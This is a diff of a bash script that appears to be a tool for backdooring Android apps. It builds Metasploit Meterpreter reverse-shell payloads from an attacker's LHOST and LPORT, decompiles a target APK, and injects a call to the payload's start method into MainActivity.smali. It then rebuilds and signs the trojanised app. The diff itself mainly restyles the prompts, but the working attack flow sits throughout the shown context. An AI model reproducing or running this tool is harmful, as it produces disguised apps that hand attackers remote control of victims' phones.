@@ -1,8 +1,21 @@
 #! /bin/bash
 
+cecho(){
+    RED="\033[0;31m"
+    GREEN="\033[0;32m"
+    YELLOW="\033[1;33m"
+    BLUE='\033[0;34m'         # Blue
+    PURPLE='\033[0;35m'       # Purple
+    CYAN='\033[0;36m'         # Cyan
+    WHITE='\033[0;37m'
+    # ... ADD MORE COLORS
+    NC="\033[0m" # No Color
+
+    printf "${!1}${2} ${NC}\n"
+}
 header()
 {
-    echo '''
+    cecho "BLUE" '''
 
 $$$$$$$$\                           $$\                                           $$\            $$\     
 \__$$  __|                          $$ |                                          \__|           $$ |    
@@ -23,14 +36,11 @@ $$$$$$$$\                           $$\                                         
 embed()
 {
 
-printf '''
-            Decompling Payload and Target APK
-
-'''
+cecho "CYAN" "Decompling Payload and Target APK"
 apktool d -f payload.apk
 
 location="$(find original/ -type f -name MainActivity.smali)"
-echo $location
+cecho "CYAN" "{$location}"
 findd=";->onCreate(Landroid/os/Bundle;)V"
 replacee='invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V'
 
@@ -85,31 +95,27 @@ do
     fi
 done
 
-printf ''' 
-        Enter name for output file (Do not add '.apk' at the end it will be added automatically)
-        >'''
+cecho "CYAN" "Enter name for output file (Do not add '.apk' at the end it will be added automatically)"
+echo ">"
 read -r outname
 add="-embed.apk"
 final="$outname$add" 
 apktool b -f original/ -o $final
 
 rm -r original payload payload.apk
-lo="$(find -type f -name '$final')"
 
-printf '''
-            Embeded APK file exported to $lo
+cecho "CYAN" "Embeded APK file exported to Trash/$final"
             
-            Do you want to sign the apk file (you can not install the apk file without signing it first) [y/n] ?
-            >'''
+            
+cecho "CYAN" "Do you want to sign the apk file (you can not install the apk file without signing it first) [y/n] ?"
+echo ">"
 read -r ysign
-
+echo $ysign
 if [[ "$ysign" == "y" ]]
 then 
 signa
 fi
-echo '''
-            Redirecting to Main Menu in 10 seconds
-            '''
+cecho "CYAN" "Redirecting to Main Menu in 10 seconds"
     sleep 10
     menu
 
@@ -117,34 +123,28 @@ echo '''
 
 payload()
 {
-    printf '''
-        Select Payload :
+    cecho "GREEN" ''' 
+    Select Payload :
 
-        [1] android/meterpreter/reverse_http           Run a meterpreter server in Android. Tunnel communication over HTTP
-        [2] android/meterpreter/reverse_https          Run a meterpreter server in Android. Tunnel communication over HTTPS
-        [3] android/meterpreter/reverse_tcp            Run a meterpreter server in Android. Connect back stager
-        [4] android/meterpreter_reverse_http           Connect back to attacker and spawn a Meterpreter shell
-        [5] android/meterpreter_reverse_https          Connect back to attacker and spawn a Meterpreter shell
-        [6] android/meterpreter_reverse_tcp            Connect back to the attacker and spawn a Meterpreter shell
-        
-        >'''
+[1] android/meterpreter/reverse_http           Run a meterpreter server in Android. Tunnel communication over HTTP
+[2] android/meterpreter/reverse_https          Run a meterpreter server in Android. Tunnel communication over HTTPS
+[3] android/meterpreter/reverse_tcp            Run a meterpreter server in Android. Connect back stager
+[4] android/meterpreter_reverse_http           Connect back to attacker and spawn a Meterpreter shell
+[5] android/meterpreter_reverse_https          Connect back to attacker and spawn a Meterpreter shell
+[6] android/meterpreter_reverse_tcp            Connect back to the attacker and spawn a Meterpreter shell
+'''
+    echo ">"
     read -r opt_pay
 
-    printf '''
-
-        Enter LHOST
-        >'''
+    cecho "CYAN" "Enter LHOST"
+    echo  ">"
     read -r lhost
 
-    printf '''
-
-        Enter LPORT
-        >'''
+    cecho "CYAN" "Enter LPORT"
+    echo ">"
     read -r lport
 
-    printf ''' 
-            Creating Payload
-    '''
+    cecho "CYAN" "Creating Payload"
 
     if [[ "$opt_pay" == "1" ]]
     then
@@ -174,12 +174,9 @@ payload()
         menu
     fi
 
-    printf '''
-
-        Enter Location Of Target APK File
-        >'''
+    cecho "CYAN" "Enter Location Of Target APK File"
+    echo  ">"
     read -r target_apk  
-
 
     apktool d -f "$target_apk" -o original 
 
@@ -193,11 +190,8 @@ curl https://raw.githubusercontent.com/rapid7/metasploit
 omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb
 > msfinstall && \
 
-echo '''
-              Installation complete ! 
-
-            Redirecting to Main Menu in 5 seconds
-            '''
+cecho "CYAN" "Installation complete !" 
+cecho "CYAN" "Redirecting to Main Menu in 5 seconds"
 sleep 5
 menu
 
@@ -206,11 +200,8 @@ apktool_install()
 {
 sudo cp apktool/apktool /usr/local/bin
 sudo cp apktool/apktool.jar /usr/local/bin
-echo '''
-              Installation complete ! 
-
-            Redirecting to Main Menu in 5 seconds
-            '''
+cecho "BLUE" "Installation complete !"
+cecho "CYAN" "Redirecting to Main Menu in 5 seconds"
 sleep 5
 menu
 
@@ -218,16 +209,13 @@ menu
 
 signa()
 {
-    printf '''
-        Enter Loaction Of The APK File
-        >'''
+    cecho "CYAN" "Enter Loaction Of The APK File"
+    echo ">"
     read -r sig_file
     echo "Password of the key is 'confirm' "
     jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore "$sig_file" alias_name
 
-    echo '''
-            Redirecting to Main Menu in 10 seconds
-            '''
+    cecho "CYAN" "Redirecting to Main Menu in 10 seconds"
     sleep 10
     menu
 }
@@ -236,14 +224,12 @@ menu()
 {
     clear
     header
-    printf '''
-        [1] Embed Backdoor In An APK File
-        [2] Sign An APK File
-        [3] Install Metaploit-Framework 
-        [4] Install Apktool
-        [5] Exit
-        
-        >'''
+    cecho "YELLOW" "[1] Embed Backdoor In An APK File"
+    cecho "YELLOW" "[2] Sign An APK File"
+    cecho "YELLOW" "[3] Install Metaploit-Framework "
+    cecho "YELLOW" "[4] Install Apktool"
+    cecho "RED" "[5] Exit"
+    echo ">"
     read -r opt
 
     if [ "$opt" == "1" ]
